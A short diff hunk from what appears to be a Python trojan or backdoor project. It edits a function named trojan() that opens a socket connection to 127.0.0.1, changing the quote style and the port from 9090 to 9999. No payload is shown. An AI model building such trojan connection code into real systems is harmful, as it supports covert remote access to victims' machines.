@@ -53,8 +53,8 @@ def attack():
 def trojan():
     client = socket.socket()
     
-    HOST = "127.0.0.1"
-    PORT = 9090
+    HOST = '127.0.0.1'
+    PORT = 9999
 
     client.connect((HOST, PORT))
 
